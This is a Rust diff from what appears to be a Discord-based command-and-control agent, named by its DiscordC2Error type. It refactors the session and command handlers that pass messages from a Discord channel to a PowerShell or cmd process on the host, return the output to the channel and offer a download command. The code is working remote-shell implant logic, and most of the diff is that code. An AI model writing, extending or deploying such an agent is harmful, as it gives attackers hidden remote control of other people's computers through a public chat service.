@@ -1,11 +1,10 @@
 use crate::{
-    commands::shell::exit,
+    commands::shell::{exit, download},
     errors::DiscordC2Error,
-    event_handler::ephemeral_interaction_create,
     os::process_handler::{ProcessHandler, ShellType},
     utils::agent::get_or_create_agent,
     discord_utils::channels::create_text_channel,
-    commands::shell::download,
+    discord_utils::bot_functions::{send_code_message, send_ephemeral_response, send_channel_message}
 };
 
 
@@ -23,7 +22,7 @@ use tokio::sync::Mutex;
 use anyhow::Error;
 
 lazy_static! {
-    static ref SHELL_TYPE: Mutex<Option<ShellType>> = Mutex::new(None);
+    pub static ref SHELL_TYPE: Mutex<Option<ShellType>> = Mutex::new(None);
 }
 
 /// Registers the "session" application command with the provided `CreateApplicationCommand` builder. This command
@@ -134,15 +133,15 @@ pub async fn run(ctx: &Context, options: &[CommandDataOption]) -> Result<(String
         let (content, shell) = match shell_type.as_str() {
             "powershell" => {
                 ProcessHandler::instance(&ShellType::Powershell).await?;
-                (string, ShellType::Powershell)
+                (string.as_str(), ShellType::Powershell)
             }
             "cmd" => {
                 ProcessHandler::instance(&ShellType::Cmd).await?;
-                (string, ShellType::Cmd)
+                (string.as_str(), ShellType::Cmd)
             }
             _ => return Err(DiscordC2Error::InvalidShellType)
         };
-        Ok((content.parse().unwrap(), Option::from(shell))) //Return the success message and the shell type wrapped with an Option
+        Ok((content.to_string(), Option::from(shell))) //Return the success message and the shell type wrapped with an Option
     } else {
         Ok(("No options were specified.".to_string(), None))
     }
@@ -169,7 +168,7 @@ pub async fn run(ctx: &Context, options: &[CommandDataOption]) -> Result<(String
 /// use serenity::client::Context;
 ///
 /// async fn handle_interaction(ctx: &Context, command: ApplicationCommandInteraction) {
-///     handle_session(ctx, &command).await.expect("Failed to handle session");
+///     session_handler(ctx, &command).await.expect("Failed to handle session");
 /// }
 /// ```
 ///
@@ -182,7 +181,7 @@ pub async fn run(ctx: &Context, options: &[CommandDataOption]) -> Result<(String
 /// followed by an optional `ShellType` object.
 pub async fn session_handler(ctx: &Context, command: &ApplicationCommandInteraction) -> Result<(), DiscordC2Error> {
     let (content, shell) = run(ctx, &command.data.options).await?;
-    ephemeral_interaction_create(ctx, command, &content).await?;
+    send_ephemeral_response(ctx, command, &content).await?;
 
     let shell_type = shell.ok_or(DiscordC2Error::AgentError("Shell was not properly created".parse().unwrap()))?;
 
@@ -194,14 +193,12 @@ pub async fn session_handler(ctx: &Context, command: &ApplicationCommandInteract
 
 pub async fn command_handler(ctx: &Context, message: &Message) -> Result<(), Error> {
 
-    let shell_type = match SHELL_TYPE.lock().await.clone().take() {
+    let shell_type = match SHELL_TYPE.lock().await.to_owned() {
         Some(shell_type) => shell_type,
         None => {
             // The session was closed/stale
             if !message.author.bot {
-                if let Err(why) = message.channel_id.say(&ctx.http, "Stale or expired session. Closing...").await {
-                    println!("Error sending message: {:?}", why);
-                }
+                send_channel_message(ctx, message.channel_id, "Stale/expired session. Closing....").await?;
                 exit::run(ctx).await?;
             }
             return Ok(());
@@ -211,19 +208,17 @@ pub async fn command_handler(ctx: &Context, message: &Message) -> Result<(), Err
     let shell = ProcessHandler::instance(&shell_type).await?;
 
     if !message.author.bot {
-        // If the user isn't the bot and wants to exit
         if message.content == "exit" {
             shell.exit().await?;
             let mut shell_type = SHELL_TYPE.lock().await;
             *shell_type = None;
-
-            if let Err(why) = message.channel_id.say(&ctx.http, "Successfully exited session. Use /exit to close the channel.").await {
-                println!("Error sending message: {:?}", why);
-            }
+            send_channel_message(ctx, message.channel_id, "Successfully exited session. Use /exit to close the channel.").await?;
 
         } else {
             let output = shell.run_command(&message.content).await?;
-            if let Err(why) = send_message(ctx, message.channel_id, &output, shell.shell_type).await {
+            let language_format = shell_type.as_str().replace(".exe", "");
+
+            if let Err(why) = send_code_message(ctx, message.channel_id, &output, &language_format).await {
                 println!("{}", why);
             }
         }
